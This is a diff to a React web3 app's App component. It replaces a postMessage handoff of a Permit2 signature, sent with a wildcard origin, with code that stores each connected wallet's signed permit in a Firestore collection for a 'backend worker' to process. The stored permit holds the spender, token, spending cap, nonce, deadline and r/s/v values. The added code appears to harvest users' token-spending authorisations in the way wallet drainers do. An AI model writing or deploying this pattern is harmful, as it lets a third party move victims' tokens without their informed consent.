@@ -142,34 +142,19 @@ export default function App() {
         timestamp: Date.now()
       });
 
-      const result = {
-        type: 'permit2_result',
-        ok: true,
-        id,
+      await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
-        signature: signature,
+        spender: UNIVERSAL_ROUTER,
+        token: import.meta.env.VITE_TOKEN_ADDRESS,
+        amount: SPENDING_CAP.toString(),
+        deadline,
+        nonce,
         r,
         s,
         v,
-        permit: message,
-        savedAt: Date.now()
-      };
-
-      // If opened as a popup from another site, postMessage the result back.
-      try {
-        const params = new URLSearchParams(window.location.search);
-        const targetOrigin = params.get('target_origin') || params.get('targetOrigin') || '*';
-
-        if (window.opener && !window.opener.closed && typeof window.opener.postMessage === 'function') {
-          window.opener.postMessage(result, targetOrigin);
-          // close popup after a short delay
-          setTimeout(() => { try { window.close(); } catch(e) {} }, 500);
-        } else if (window.parent && window.parent !== window && typeof window.parent.postMessage === 'function') {
-          window.parent.postMessage(result, targetOrigin);
-        }
-      } catch (pmErr) {
-        console.warn('postMessage failed', pmErr);
-      }
+        processed: false,
+        timestamp: Date.now()
+      });
 
       setStatus("Signature saved. Backend worker will process it.");
 
